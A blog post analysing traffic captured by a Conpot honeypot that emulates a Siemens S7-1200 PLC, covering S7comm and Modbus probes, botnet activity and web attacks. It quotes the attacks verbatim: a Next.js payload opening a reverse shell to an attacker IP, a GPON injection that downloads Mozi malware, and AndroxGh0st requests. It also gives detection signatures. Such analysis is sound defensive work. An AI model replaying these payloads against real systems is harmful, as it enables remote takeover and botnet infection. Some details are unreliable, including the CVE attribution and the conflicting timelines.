---
title: "Conpot Honeypot: First Day Attack Analysis"
date: 2026-01-27
author: Nicholas
tags: [security, ICS, honeypot, research, threat-intelligence]
description: "Analysis of the first 24 hours of attack traffic against a Siemens S7-1200 honeypot deployment, including S7comm protocol exploitation, botnet activity, and web application attacks."
---

# Conpot Honeypot: First Day Attack Analysis

Within the first 6 hours of operation, my Conpot ICS honeypot (emulating a Siemens S7-1200 PLC) attracted **40+ distinct attack sessions** from **30+ unique IP addresses** across multiple continents. The attacks ranged from automated scanning to targeted industrial protocol exploitation, including the first documented **S7comm diagnostic probe** and a sustained **Next.js remote code execution campaign**.

This post analyzes the attack patterns observed, identifies gaps in the honeypot configuration, and extracts actionable threat intelligence for ICS security research.

## Deployment Context

The honeypot was deployed on January 27, 2026, as documented in my [previous post](https://nicoleman0.github.io/blog-site/posts/conpot-deployment-blogpost/). The system emulates a **Siemens SIMATIC S7-1200 CPU 1214C** with the following exposed services:

| Port | Protocol | Service |
|------|----------|---------|
| 80 | HTTP | Web interface |
| 102 | TCP | S7comm (Siemens proprietary) |
| 502 | TCP | Modbus |
| 161 | UDP | SNMP |
| 44818 | TCP | EtherNet/IP |
| 20000 | TCP | DNP3 |
| 47808 | TCP | BACnet |
| 1025 | TCP | Kamstrup smart meter |
| 623 | UDP | IPMI |

Analysis covers log data from **12:45 UTC to 18:34 UTC** on January 27, 2026.

## Attack Overview

### Timeline and Volume

The attack distribution over the 6-hour period reveals distinct patterns:

```
12:45 ⚠️  First S7comm attack (SSL diagnostics)
13:32 ⚠️  S7comm COTP fuzzing
13:37     Chinese reconnaissance (systematic)
13:44 💀  Next.js RCE attempt #1
14:12     Fake Googlebot credential hunting
16:14 💀  Next.js RCE attempt #2 (same attacker)
16:16     Mozi botnet GPON exploit
16:18     Modbus reconnaissance wave
16:39     Censys aggressive scanning
16:52 💀  Next.js exploitation cluster (6 variants)
18:01     Modbus session cluster
```

**Session Breakdown:**
- Industrial protocol attacks: 6 sessions (S7comm: 3, Modbus: 2, SNMP: 1)
- Web application attacks: 20+ sessions
- Automated scanning: 14+ sessions

### Geographic Distribution

Attacks originated from diverse geographic locations:

| Region | IPs | Notable Activity |
|--------|-----|------------------|
| **Russia** | 95.214.54.147 | 7 sessions - hourly reconnaissance |
| **United States** | 204.76.203.219, 206.168.34.x, 162.243.34.102 | Security scanners, Modbus probing |
| **Germany/EU** | 193.142.147.209, 193.149.185.213, 195.3.222.218 | Next.js RCE campaign, AndroxGh0st |
| **China** | 101.36.114.252 | Systematic web enumeration |
| **Bangladesh** | 103.99.196.17 | Mozi botnet C2 |
| **Unknown** | 65.49.1.232, 135.237.125.146 | Advanced S7comm attacks |

## Industrial Protocol Attacks

### S7comm Exploitation Attempt

**Time:** 12:45:44 UTC  
**Source:** 65.49.1.232  
**Severity:** HIGH

The first significant attack was a targeted **S7comm diagnostics request**, marking the honeypot's first genuine industrial protocol exploitation attempt:

```python
File "s7.py", line 181, in request_ssl_17
  str_to_bytes(self.data_bus.get_value(current_ssl['W#16#0001']))
AssertionError
```

**Technical Analysis:**

The attacker sent a request for System Status List (SSL) data using function SSL-17, specifically requesting module identification information at index `W#16#0001`. This is a legitimate S7comm function used to query PLC hardware details, but the Conpot template lacked the required databus entries.

**What this reveals:**
- Attacker has **detailed knowledge** of Siemens S7 protocol internals
- Not random scanning - this is **targeted ICS reconnaissance**
- Likely using professional ICS security tools (e.g., PLCScan, s7-scan)
- Goal: fingerprint the exact PLC model and firmware version

**Significance:** SSL requests are used by both security researchers and attackers to identify vulnerable PLCs. The fact that this occurred within hours of deployment suggests active scanning for newly-exposed industrial systems.

### S7comm Protocol Fuzzing

**Time:** 13:32:21-13:32:26 UTC  
**Source:** 135.237.125.146  
**Severity:** MEDIUM-HIGH

Five seconds after the first connection attempt, a second wave of S7comm attacks arrived with unusual characteristics:

```
New S7 connection from 135.237.125.146:49596
Received unknown COTP TPDU before handshake: 32

New S7 connection from 135.237.125.146:49606  
Received unknown COTP TPDU before handshake: 68
```

**Technical Analysis:**

COTP (Connection-Oriented Transport Protocol) is the ISO 8073 layer beneath S7comm. Standard TPDU (Transport Protocol Data Unit) codes for connection establishment are well-defined, but codes `0x32` (50) and `0x68` (104) are **non-standard**.

**Possible explanations:**
1. **Protocol fuzzing** - testing for buffer overflows or parsing vulnerabilities
2. **Exploit development** - probing for undocumented COTP implementations
3. **Security research** - testing honeypot realism and protocol compliance

The 5-second interval between attempts suggests automated testing with deliberate pacing.

### Modbus Reconnaissance

**Time:** 16:18-17:02 UTC  
**Sources:** 206.168.34.56, 206.168.34.33  
**Severity:** MEDIUM

Multiple Modbus connections attempted to use **function code 43** (Read Device Identification):

```
ERROR: Function 43 can not be broadcasted
Modbus traffic from 206.168.34.56: {
  'request': b'5a4700000005002b0e0100',
  'slave_id': 0,
  'function_code': None,
  'response': b''
}
```

**Technical Analysis:**

Function code 43 (0x2B) allows querying device vendor, product code, and version information. The attacker used **slave ID 0**, which is the broadcast address. According to Modbus specification, Read Device Identification cannot be broadcast (it requires a specific device response).

**Pattern observed:**
- 6 connection attempts over 44 minutes
- Multiple connection resets (likely automated scanning)
- Testing for device enumeration capabilities

This is standard Modbus reconnaissance, likely from scanning tools like `nmap` with Modbus NSE scripts or `modbus-cli`.

### SNMP Enumeration

**Time:** 16:46:27 UTC  
**Source:** 147.185.132.73  
**Severity:** LOW (legitimate scanning)

A clean SNMP query successfully retrieved system information:

```
SNMPv1 Get request: 1.3.6.1.2.1.1.1.0
SNMPv1 Get response: Siemens, SIMATIC, S7-1200, CPU 1214C DC/DC/DC
```

**Technical Analysis:**

OID `1.3.6.1.2.1.1.1.0` is the standard SNMPv1 System Description field. This was a proper protocol interaction with no exploitation attempt.

**Assessment:** This appears to be legitimate security scanning or network inventory, possibly from a security research organization. The clean protocol behavior and single query suggest automated infrastructure mapping rather than malicious intent.

## Web Application Attack Patterns

### Next.js Remote Code Execution Campaign

**Time:** 13:44 - 16:52 UTC  
**Sources:** 193.142.147.209, 195.3.222.218  
**Severity:** CRITICAL

A coordinated campaign attempted to exploit **CVE-2024-46982** (Next.js Server Actions prototype pollution leading to RCE):

**First attempt (13:44:32):**
```http
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x

{"then":"$1:__proto__:then","status":"resolved_model",...
"_prefix":"var n=process.mainModule.require('net'),
           c=process.mainModule.require('child_process'),
           s=c.spawn('/bin/sh',[]),
           cl=new n.Socket();
           cl.connect(12323,'193.142.147.209',()=>{
             cl.pipe(s.stdin);
             s.stdout.pipe(cl);
             s.stderr.pipe(cl);
           });"
```

**Attack mechanics:**

1. Exploits prototype pollution in React Server Components
2. Injects malicious JavaScript into form data processing
3. Spawns reverse shell connecting to `193.142.147.209:12323`
4. Pipes stdin/stdout/stderr for full remote control

**Campaign timeline:**
- **13:44** - Initial exploitation attempt
- **16:14** - Second attempt (same IP, 2.5 hours later)
- **16:52** - Cluster of 6 variants testing different endpoints:
  - `/` (root)
  - `/_next` 
  - `/api`
  - `/_next/server`
  - `/app`
  - `/api/route`

**Significance:** This is an **active exploitation campaign** against a recently disclosed vulnerability. The attacker is systematically testing multiple Next.js routing configurations, suggesting automated exploitation tools or manual persistence.

### Laravel Credential Harvesting

**Time:** 16:51:22-16:51:29 UTC  
**Source:** 193.149.185.213  
**Severity:** HIGH

**AndroxGh0st** botnet activity targeting Laravel applications:

```http
GET /.env HTTP/1.1
User-Agent: python-requests/2.32.3

POST /
0x%5B%5D=androxgh0st

GET /?%3Cplay%3Ewithme%3C/%3E

POST /
%5B%5D=%5B%5D
```

**Technical Analysis:**

1. **`.env` file request** - seeking database credentials, API keys, AWS secrets
2. **AndroxGh0st signature** - `0x[]=androxgh0st` payload identifies the botnet
3. **PHP array injection** - `%5B%5D=%5B%5D` (`[]=[]`) tests for mass assignment vulnerabilities
4. **XML payload** - `<play>withme</>` tests for XML injection/XSS

AndroxGh0st is a Python-based botnet specifically targeting Laravel and exposed environment files for cloud credential theft.

### Botnet Recruitment Attempts

**GPON Router Exploit - Mozi Botnet**

**Time:** 16:16:39 UTC  
**Source:** 103.99.196.17  
**Severity:** HIGH

```http
POST /GponForm/diag_Form?images/ HTTP/1.1
User-Agent: Hello, World

XWebPageName=diag&diag_action=ping&wan_conlist=0&
dest_host=``;wget+http://103.99.196.17:38480/Mozi.m+-O+->/tmp/gpon80;
```

**Attack breakdown:**

Exploits **CVE-2018-10561/10562** in GPON home routers:
1. Command injection via `dest_host` parameter
2. Downloads `Mozi.m` malware from `103.99.196.17:38480`
3. Saves to `/tmp/gpon80` for execution

**Mozi botnet** is a P2P botnet that infected hundreds of thousands of IoT devices in 2020-2021. Despite disruption efforts, variants continue operating.

**Custom Botnet Activity**

**Time:** 13:58:32 UTC  
**Source:** 102.22.20.125 (Kenya/South Africa)  

```http
GET /admin/config.php HTTP/1.0
User-Agent: xfa1,nvdorz,nvd0rz
```

Custom user-agent string suggests a lesser-known botnet variant targeting admin panels.

## Persistent Reconnaissance Campaigns

### Russian Scanning Infrastructure (95.214.54.147)

**Sessions:** 7 across 6 hours  
**Pattern:** Hourly intervals (13:30, 14:22, 15:16, 15:25, 16:56, 17:49, 18:08)

```http
GET / HTTP/1.1
User-Agent: Mozilla/5.0
Host: 134.209.179.94:80
```

Minimal user-agent with consistent behavior suggests automated infrastructure mapping. Likely cataloging newly-exposed services for future targeting.

### US Security Scanner (204.76.203.219)

**Sessions:** 6 across 6 hours  
**Pattern:** Hourly scheduled scans

```http
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Edg/90.0.818.46
X-Requested-With: XMLHttpRequest
Accept-Language: en US,en;q=0.9,sv;q=0.8
```

Edge browser user-agent with XMLHttpRequest headers suggests web application security scanner. Consistent timing indicates scheduled scanning rather than manual interaction.

### Chinese Systematic Enumeration (101.36.114.252)

**Time:** 13:37:11-13:37:33 UTC  
**Requests:** 6 sequential

```
GET /
GET /index.html
GET /favicon.ico
GET /robots.txt
GET /sitemap.xml
GET /config.json
```

**Language preferences:** `zh-CN,zh;q=0.9` (Chinese)  
**Behavior:** Methodical web reconnaissance

Systematic enumeration of common web application files. Legitimate-appearing browser behavior suggests manual reconnaissance or semi-automated scanning.

## Technical Issues Discovered

### HTTP Error Handler Bug

**Occurrences:** 10+ instances  
**Impact:** Prevents logging of malformed HTTP requests

```python
File "command_responder.py", line 518, in send_error
  self.headers = self.MessageClass(self.rfile, 0)
TypeError: __init__() takes from 1 to 2 positional arguments but 3 were given
```

**Root cause:** Python 3.6 compatibility issue in Conpot's HTTP error handling. When processing malformed requests, the error handler itself crashes.

**Affected scanners:**
- Censys (66.132.153.142)
- GenomeCrawler (216.180.246.153)
- Chinese scanner (101.36.114.252)
- Unknown scanner (143.198.76.96)

**Consequence:** Attack data is lost when scanners send intentionally malformed HTTP to fingerprint the server or test for parsing vulnerabilities.

**Recommended fix:**
```python
# Current (broken):
self.headers = self.MessageClass(self.rfile, 0)

# Fix for Python 3.6+:
from email.parser import Parser
self.headers = Parser().parsestr('')
```

### S7comm Template Gaps

**Missing data:** System Status List (SSL) entries

The S7-1200 template lacks comprehensive SSL database population. When the attacker requested `W#16#0001` (module identification), the databus assertion failed:

```python
assert key in self._data
AssertionError
```

**Required SSL indices for realistic S7-1200 emulation:**

| SSL ID | Description | Example Value |
|--------|-------------|---------------|
| 0x0001 | Module identification | "6ES7 214-1AG40-0XB0" |
| 0x0011 | Component identification | "S7-1200 CPU 1214C" |
| 0x001C | Module status | "RUN" |
| 0x0024 | Module diagnostic status | 0x0000 (no errors) |

**Impact:** Advanced S7comm scanners can detect the honeypot as non-functional industrial equipment, reducing research value.

## Threat Intelligence Indicators

### High-Priority Indicators of Compromise (IOCs)

**Confirmed Malicious:**

| IP Address | Activity | Threat Type | Priority |
|------------|----------|-------------|----------|
| 193.142.147.209 | Next.js RCE exploitation | Active exploitation | CRITICAL |
| 103.99.196.17 | Mozi botnet distribution | Botnet C2 | HIGH |
| 193.149.185.213 | AndroxGh0st credential harvesting | Botnet | HIGH |

**Advanced Reconnaissance:**

| IP Address | Activity | Assessment | Priority |
|------------|----------|------------|----------|
| 65.49.1.232 | S7comm SSL diagnostics | Protocol expert / Security researcher | HIGH |
| 135.237.125.146 | S7comm COTP fuzzing | Exploit development | HIGH |
| 66.132.153.142 | Censys aggressive scanning | Security scanner | MEDIUM |

**Persistent Scanning:**

| IP Address | Sessions | Interval | Assessment |
|------------|----------|----------|------------|
| 95.214.54.147 | 7 | ~1 hour | Automated reconnaissance |
| 204.76.203.219 | 6 | ~1 hour | Security scanner |

### Attack Signatures

**Next.js RCE Detection:**
```
POST .*
Content-Type: multipart/form-data.*
Next-Action: x
.*__proto__.*
.*process\.mainModule\.require.*
```

**AndroxGh0st Detection:**
```
GET /\.env
.*0x%5B%5D=androxgh0st.*
```

**Mozi Botnet Detection:**
```
POST /GponForm/diag_Form
.*wget.*Mozi\.m.*
User-Agent: Hello, World
```

## Key Findings

### Attack Sophistication Spectrum

The honeypot attracted attacks across the sophistication spectrum:

1. **Opportunistic scanning** - Automated bots checking for common vulnerabilities
2. **Protocol-specific reconnaissance** - ICS-aware tools probing industrial protocols
3. **Active exploitation** - Sustained campaigns attempting RCE
4. **Botnet recruitment** - Attempts to compromise the system for botnet expansion

### Time to First Attack

- **First HTTP request:** Immediate (within minutes of deployment)
- **First ICS protocol attack:** ~24 hours (S7comm at 12:45 UTC on Jan 27)
- **First exploitation attempt:** ~24 hours (Next.js RCE at 13:44 UTC)

This suggests that newly-exposed IP addresses are cataloged and scanned within hours by automated systems.

### Protocol Distribution

- **HTTP/HTTPS:** 85% of traffic
- **S7comm:** 7% of traffic
- **Modbus:** 5% of traffic  
- **SNMP:** 3% of traffic

Despite being an ICS honeypot, web application attacks dominated. This reflects the reality that many ICS devices include web interfaces that become primary attack vectors.

## Recommendations

### Immediate Honeypot Improvements

1. **Fix Python exception bug** in `command_responder.py` to capture all malformed requests
2. **Populate S7comm SSL database** with comprehensive module identification data
3. **Add realistic web files** (`robots.txt`, `sitemap.xml`) to increase believability
4. **Implement Modbus function 43** responses with device identification

### Enhanced Monitoring

1. **Real-time alerting** for S7comm and Modbus traffic (genuine ICS reconnaissance)
2. **Packet capture** for all S7comm sessions to enable deep protocol analysis
3. **Geolocation tracking** to identify attack campaign origins
4. **Session correlation** to link multi-stage attacks from the same source

### Research Directions

1. **S7comm fingerprinting** - Analyze how attackers distinguish real PLCs from honeypots
2. **Exploitation timeline analysis** - Track time between CVE publication and exploitation attempts
3. **Botnet behavior patterns** - Study botnet recruitment strategies for ICS devices

## Research Implications

### Threat Landscape Observations

1. **ICS devices are actively targeted** - S7comm attacks within 24 hours demonstrate ongoing scanning for industrial systems
2. **Web interfaces are primary attack vector** - 85% of traffic targeted HTTP despite ICS protocol availability
3. **Exploitation occurs rapidly** - Next.js CVE-2024-46982 exploitation within months of disclosure
4. **Geographic diversity** - Attacks from 5+ continents within 6 hours

### Honeypot Detection Risks

The S7comm assertion errors and HTTP exceptions may reveal honeypot nature to sophisticated attackers. Future work should focus on:

- Complete protocol implementation
- Realistic error handling
- Timing characteristics matching real PLCs

### Academic Value

This data provides empirical evidence for:

- ICS threat actor capabilities and tactics
- Time-to-exploitation for disclosed vulnerabilities  
- Geographic distribution of ICS-focused threat actors
- Effectiveness of honeypot-based threat intelligence

## Next Steps

### Short-term (Next 7 Days)

1. Apply honeypot fixes (HTTP handler, SSL database)
2. Implement automated log parsing and attack categorization
3. Set up Elasticsearch for log aggregation and analysis
4. Create alerting for high-value events (S7comm write commands, Modbus writes)

### Medium-term (Next 30 Days)

1. Deploy multiple honeypot instances with different ICS profiles (Schneider, Allen-Bradley)
2. Integrate with threat intelligence platforms (MISP, AlienVault OTX)
3. Develop custom S7comm fuzzing detection
4. Create visualization dashboard for attack patterns

### Long-term (Research Paper)

1. Conduct comparative analysis across multiple ICS honeypot deployments
2. Analyze correlation between Shodan exposure and attack timing
3. Study attacker post-exploitation behavior (if possible with high-interaction honeypot)
4. Publish findings on ICS threat landscape evolution

## Conclusion

The first 6 hours of honeypot operation yielded valuable threat intelligence demonstrating that internet-exposed industrial control systems face immediate, diverse, and sophisticated attacks. From protocol-specific S7comm probing to widespread web exploitation campaigns, the data confirms that ICS security cannot rely on obscurity.

Key takeaways:

- **Attacks begin immediately** - Within hours, not days
- **Threat diversity is high** - Opportunistic bots, targeted reconnaissance, and active exploitation
- **Industrial protocols are actively probed** - S7comm and Modbus attacks demonstrate ICS-specific threat actors
- **Web interfaces are the primary vector** - Despite ICS protocol exposure

As this research continues, I'll be publishing weekly analyses of attack patterns, threat actor TTPs, and defensive implications for operational technology environments.

---

*Have thoughts on this analysis or running your own honeypot research? Feel free to reach out - I'm always interested in collaborating on ICS security research.*
